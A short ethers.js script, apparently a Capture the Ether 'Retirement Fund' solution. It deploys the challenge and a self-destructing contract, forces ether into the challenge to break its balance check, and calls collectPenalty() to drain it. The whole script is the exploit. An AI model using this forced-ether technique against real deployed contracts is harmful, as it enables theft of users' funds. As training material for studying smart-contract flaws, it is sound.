// ethers is already injected

const provider = new ethers.providers.JsonRpcProvider($rpcUrl)
const signer = provider.getSigner()
const address = await signer.getAddress()
const contract1 = $contracts["RetirementFundChallenge"]
const contract2 = $contracts["Destruct"]
const factory1 = new ethers.ContractFactory(contract1.abi, contract1.evm.bytecode, provider.getSigner())
const factory2 = new ethers.ContractFactory(contract2.abi, contract2.evm.bytecode, provider.getSigner())

const ch = await factory1.deploy(address, { value: ethers.utils.parseEther("1"), gasLimit: 1000000 })
const dc = await factory2.deploy({ value: ethers.utils.parseEther("1"), gasLimit: 1000000 })

await dc.destroy(ch.address);
await ch.collectPenalty();

console.log(`Player: ${(await ch.isComplete()).toString()}`)
